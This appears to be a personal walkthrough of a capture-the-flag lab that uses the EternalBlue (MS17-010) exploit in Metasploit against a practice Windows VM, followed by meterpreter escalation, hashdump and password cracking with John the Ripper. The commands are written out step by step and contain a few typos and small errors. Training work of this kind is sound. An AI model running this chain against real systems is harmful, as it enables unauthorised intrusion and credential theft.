#Task 1: Recon
1. Scan the machine
nmap -sS -Pn -A -p- -oN nmap.txt 10.10.166.143

2. How many ports are open with a port number under 1000?
3

3. What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
sbm security
ls -al /usr/share/nmap/scripts | grep -e "smb-"
Vulnerability codes

sudo nmap -sS -Pn -p 445 <ip> --script smb-vuln-ms17-010.nse
- 445: smb port)
- smb-vuln-ms17-010.nse: eternal blue vulnerability)

#Task 2: Gain access
1. Start metasploit
$ msfconsole

2. Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
$ msf5 > search eternalblue
$ msf5 > use exploit/windows/smb/ms17_010_eternalblue

3.Show options and set the one required value. What is the name of this value? (All caps for submission)
$ msf5 > show options
$ msf5 > set RHOSTS <IP>
$ msf5 > set LHOSTS <MY IP ADDRESS>

4. With that done, run the exploit!
$ msf5 > run

5. Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target. 

#Task 3: Escalate
1. If you haven't already, background the previously gained shell (CTRL + Z). 
Research online how to convert a shell to meterpreter shell in metasploit. 
What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 
ctrl z to background
$ msf5 > sessions (will list sessions)
$ msf5 > search shell_to
$ msf5 > use post/multi/manage/shell_to_meterpreter

2. Select this (use MODULE_PATH). Show options, what option are we required to change?
$ msf5 > show options
The only options we need to specify is the
LHOST and SESSION

3. Set the required option, you may need to list all of the sessions to find your target here. 
$ msf5 > set SESSION 1

4. Run! If this doesn't work, try completing the exploit from the previous task once more.
$ msf5 > run (if doesnt work)

5. Once the meterpreter shell conversion completes, select that session for use.
$ msf5 > sessions 1

6. Verify that we have escalated to NT AUTHORITY\SYSTEM. 
Run getsystem to confirm this. 
Feel free to open a dos shell via the command 'shell' and run 'whoami'. 
This should return that we are indeed system. 
Background this shell afterwards and select our meterpreter session for usage again. 
$ msf5 > sessions 1
$ meterpreter > shell
$ meterpreter > whoami

7. List all of the processes running via the 'ps' command. 
Just because we are system doesn't mean our process is. 
Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).
$ meterpreter > ps (lists processes)
2596, sppsvc.exe, NT AUTHORITY\NETWORK SERVICE (access denied)
2488, svchost.exe, NT AUTHORITY\SYSTEM (access denied)

8. Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. 
This may take several attempts, migrating processes is not very stable. 
If this fails, you may need to re-run the conversion process or reboot the machine and start once again. 
If this happens, try a different process next time. 
$ meterpreter > migrate 2596

$ meterpreter > shell
$ meterpreter > whoami


#Task 4: Cracking
1. Within our elevated meterpreter shell, run the command 'hashdump'. 
This will dump all of the passwords on the machine as long as we have the correct privileges to do so. 
What is the name of the non-default user? 
Jon

$ meterpreter > hashdump (gives various hashes for the users on the system) (copy hashes)

vim hashes.txt
insert hash for Jon

Watch video on John the Ripper

sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
sudo john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

2. Copy this password hash to a file and research how to crack it. What is the cracked password?

#Task 5: Find Flags!
Flag 1
$ meterpreter > cd C:\\
$ meterpreter > dir
$ meterpreter > cat flag1.txt

Flag 2
$ meterpreter > cd C:\\
$ meterpreter > search -f flag2.txt

Flag 3
$ meterpreter > cd Documents
$ meterpreter > dir
$ meterpreter > cat flag3.txt
